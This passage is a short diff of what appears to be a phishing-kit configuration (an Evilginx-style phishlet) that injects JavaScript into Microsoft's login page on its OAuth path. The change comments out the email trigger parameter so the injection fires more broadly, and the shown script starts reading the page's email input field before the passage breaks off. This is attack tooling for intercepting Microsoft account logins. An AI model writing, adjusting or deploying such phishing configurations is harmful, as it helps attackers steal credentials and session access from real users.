@@ -163,7 +163,7 @@ login:
 js_inject:
   - trigger_domains: ["login.microsoftonline.com"]
     trigger_paths: ["/common/oauth2/"]
-    trigger_params: ["email"]
+    # trigger_params: ["email"]
     script: |
       function lp(){
         var email = document.querySelectorAll('input[type=email]')[0];
